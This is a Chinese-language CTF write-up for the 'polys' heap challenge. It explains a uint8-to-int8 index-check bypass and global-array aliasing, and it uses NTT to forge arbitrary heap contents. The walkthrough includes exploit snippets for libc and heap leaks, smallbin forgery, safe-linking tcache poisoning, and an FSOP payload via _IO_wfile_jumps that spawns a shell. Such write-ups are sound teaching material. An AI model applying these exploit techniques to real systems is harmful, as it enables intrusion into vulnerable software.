# polys

## 题目简述

服务实现了一个长度为 128 的多项式运算器，支持读入、多项式乘法、加法和输出。系数位于模数

$q=2281701377$

下，内部使用 NTT 加速乘法。每个多项式的 128 个 32 位元素占用 512 字节，存放在堆上。

漏洞位于乘法功能的索引检查：程序先把用户输入的 `uint32_t` 截断成 `uint8_t`，再把结果转成 `int8_t` 检查上界。`253`、`254`、`255` 会被解释成负数，因而绕过 `>= 0x40` 的判断。结合全局数组的刻意布局，可获得越界指针和长度控制，最终完成堆泄漏、tcache 污染和 FSOP。

仓库说明把程序称为位于 seccomp 沙箱中，但随附 Makefile 实际执行的是：

```make
$(CC) $(CFLAGS) -o $@ polys.c
```

`seccomp.c` 只是依赖项，没有被编译或链接，`polys.c` 也没有调用安装过滤器的函数。官方利用最后直接调用 `system("/bin/sh")`，与实际构建中没有启用 seccomp 相符。分析时不能只依据 README 判断运行时约束。

## 解题过程

### 1. 找到有符号截断漏洞

正常多项式槽位只有 64 个：

```c
#define POLY_COUNT 0x40
```

`read_poly()`、`add_polys()` 和 `show_poly()` 都直接以 32 位无符号数检查索引。只有 `multiply_polys()` 使用了不同的类型转换：

```c
uint32_t tmp;

read_uint32(&tmp);
uint8_t idx_a = (uint8_t)tmp;

read_uint32(&tmp);
uint8_t idx_dest = (uint8_t)tmp;

if ((int8_t)idx_a >= POLY_COUNT ||
    (int8_t)idx_dest >= POLY_COUNT ||
    !polys[idx_a]) {
    puts("Invalid indices");
    return;
}
```

当低字节为 `0xfd`、`0xfe`、`0xff` 时：

```text
(uint8_t)0xfd = 253 -> (int8_t)0xfd = -3
(uint8_t)0xfe = 254 -> (int8_t)0xfe = -2
(uint8_t)0xff = 255 -> (int8_t)0xff = -1
```

这些值都小于 `0x40`，检查通过。参考脚本使用十进制无符号输入：

```python
UINT32_MOD = 1 << 32
TARGET = UINT32_MOD - 3
TARGET_PTR = TARGET + 1
TARGET_DEG = TARGET + 2
```

输入经读取函数保存为 `uint32_t`，再截成低 8 位，所以三者分别落在越界索引 253、254、255。

### 2. 理解 `polys` 与 `poly_degrees` 的别名布局

全局存储不是普通的两个相邻数组，而是特意插入了一段间隔：

```c
typedef struct {
    uint8_t degree;
    uint8_t sign;
    uint8_t reserved[2];
} degree_t;

#define U8_INDEX_COUNT 0x100
#define POLY_ALIAS_INDEX (U8_INDEX_COUNT - 3)
#define POLY_DEGREES_OFFSET \
    (POLY_ALIAS_INDEX * (sizeof(uint32_t *) - sizeof(degree_t)))

typedef struct {
    uint32_t *polys[POLY_COUNT];
    uint8_t degree_gap[POLY_DEGREES_GAP];
    degree_t poly_degrees[POLY_COUNT];
} poly_store_t;
```

在 64 位环境中，指针为 8 字节，`degree_t` 为 4 字节，因此：

$\text{POLY\_DEGREES\_OFFSET}=253\times(8-4)=1012$

而两个越界元素的地址分别为：

$\operatorname{addr}(\text{polys}[253])=\text{base}+253\times8=\text{base}+2024$

$\operatorname{addr}(\text{poly\_degrees}[253])=\text{base}+1012+253\times4=\text{base}+2024$

两者完全重合。后续索引也会继续形成有用的交叉别名。乘法函数既读取/写回 `polys[idx]`，又更新 `poly_degrees[idx].degree`，于是同一个越界操作可以把“多项式指针”和“多项式长度元数据”互相解释，为指针迁移、长度扩大以及越界读写提供基础。

### 3. 把多项式接口变成 512 字节数据生成器

程序将用户输入的系数先做正向 NTT；加法在 NTT 域逐点相加，乘法在 NTT 域逐点相乘。官方脚本先创建：

- 32 个常数多项式，值分别为 $2^0$ 到 $2^{31}$；
- 多项式 $X$；
- 常数 $0$ 和 $1$；
- 若干临时槽位。

随后用 Horner 形式构造任意系数向量：

```python
for coeff in poly[::-1]:
    clear(T0)
    for bit in range(32):
        if (coeff >> bit) & 1:
            add(T0, B[bit], T0)
    multiply(X, T1)
    add(T0, T1, T1)
```

这绕过了 `read_poly()` 对初始次数 `deg <= 0x10` 的限制，逐步生成最多 128 个任意 32 位系数。

若目标不是“数学意义上的多项式”，而是希望某个 512 字节堆块具有指定原始字节，参考脚本先把字节按小端拆成 128 个 32 位整数，再做逆 NTT：

```python
def bytes2poly(b):
    b = b.ljust(0x200, b"\x00")
    return [
        int.from_bytes(b[i:i + 4], "little")
        for i in range(0, len(b), 4)
    ]

def make_bytes(b, dest):
    wanted_internal_words = bytes2poly(b)
    ntt(wanted_internal_words, invert=True)
    make_poly(wanted_internal_words, dest)
```

程序对该系数向量执行正向 NTT 后，堆中保存的 128 个 NTT 域元素恰好恢复成期望的 512 字节。这样，多项式菜单就成了精确的堆块内容生成器。

### 4. 扩大长度并泄漏 libc 与堆地址

参考脚本利用索引 253 至 255 的别名关系，反复构造高次数的零/一多项式并送入越界目标，调整目标指针与 `degree`。其目的有两个：

1. 让 `show_poly()` 从攻击者选定的堆位置复制 512 字节；
2. 让输出次数覆盖包含 allocator 指针的区域。

`show_poly()` 会先对复制出的 128 个字执行逆 NTT，然后逐项打印。由于泄漏目标本来不是 NTT 数据，脚本收到输出后再做一次正向 NTT，恢复真实内存字：

```python
sess.show_poly(R[10])
poly = sess.recv_poly()
ntt(poly, invert=False)
```

参考环境中的关键泄漏位于：

```python
libc_leak = poly[0x75] * 2**32 + poly[0x74]
heap_leak = poly[0x79] * 2**32 + poly[0x78]

libc_base = libc_leak - 0x203f90
heap_base = heap_leak - 0x69b0
```

输出系数会按 $q$ 取模，因此某个 32 位字可能被表示成原值减 $q$。脚本发现计算出的基址未按页对齐时，会给低位候选补回一次 `MOD`，再重新计算。最后同时检查：

```python
libc_base & 0xfff == 0
heap_base & 0xfff == 0
```

这些偏移与仓库附带的 Ubuntu 24.04 `libc.so.6` 和参考堆布局绑定，换 libc 或改变分配顺序后必须重新求偏移。

### 5. 构造 smallbin 链并污染 tcache

拿到地址后，官方脚本在可控的 512 字节块中伪造多组大小为 `0x211` 的 chunk：

```python
smallbin = libc_base + 0x203d20
victim = heap_base + 0x5d60
origin = heap_base + 0x6dd0
```

伪造链把若干 chunk 的 `fd`、`bk` 串联起来，并让边界节点连接回 libc 中的 smallbin 头。另一组按位乘法载荷把原有 smallbin 指针替换成 `origin` 和 `victim`，使后续 0x200 大小分配按攻击者设计的链条移动。

随后使用 glibc safe-linking 编码构造 tcache `next`：

```python
encoded_next = (
    (heap_base + 0x5df0) >> 12
) ^ (_IO_list_all - 0x110)
```

即：

$\text{encoded}=\text{target}\oplus(\text{chunk\_addr}\gg12)$

目标选成 `_IO_list_all - 0x110`，是因为后续把伪造 FILE 指针写在返回块偏移 `0x110` 处，最终正好覆盖 `_IO_list_all`。

### 6. 通过 `_IO_wfile_jumps` 触发 `system`

参考 libc 中使用的符号偏移为：

```python
_IO_list_all = libc_base + 0x2044c0
system = libc_base + 0x58750
_IO_wfile_jumps = libc_base + 0x202228
```

伪造 FILE 对象的关键字段为：

```python
fake_file_addr = heap_base + 0x5730
payload = flat({
    0x00: b"  sh;",
    0x28: system,
    0x88: fake_file_addr + 0x6000,
    0xa0: fake_file_addr - 0x10,
    0xd0: fake_file_addr + 0x28 - 0x68,
    0xd8: _IO_wfile_jumps,
}, filler=b"\x00")
```

布局借助宽字符 FILE 调用链，把本应调用的函数指针导向 `system`。FILE 起始位置放置 `"  sh;"`，使对象地址同时成为可接受的命令字符串地址。

最后通过几次新建/加法操作消耗被污染的 tcache 条目，把 `fake_file_addr` 写入 `_IO_list_all`。选择菜单退出后，glibc 清理标准 IO 流并遍历 `_IO_list_all`，从伪造 vtable 路径进入 `system("  sh;")`，得到 shell。

读取 flag 的参考命令为：

```bash
python3 solve.py --host challenge-host --port 1337 --cat-flag
```

本地调试可使用：

```bash
python3 solve.py --local --binary ./attachment/polys --cat-flag
```

## 方法总结

本题由四层原语串联而成：

1. `uint32_t -> uint8_t -> int8_t` 的错误检查让 253、254、255 三个越界索引合法化；
2. 精心安排的全局结构让越界 `polys[]` 与 `poly_degrees[]` 发生别名，得到指针和长度控制；
3. NTT 的线性结构允许从受限菜单构造任意 512 字节堆块，并把输出接口反向用于内存泄漏；
4. 在匹配 libc 上伪造 smallbin、污染 safe-linking tcache，再以 `_IO_list_all` 和 `_IO_wfile_jumps` 完成 FSOP。

容易忽略的两点是：第一，索引检查必须按每一步整数转换后的实际类型分析；第二，数学接口中的变换域数据本质上仍是内存，能构造任意 NTT 域向量时，就可能把“多项式运算”降格成通用字节写入工具。
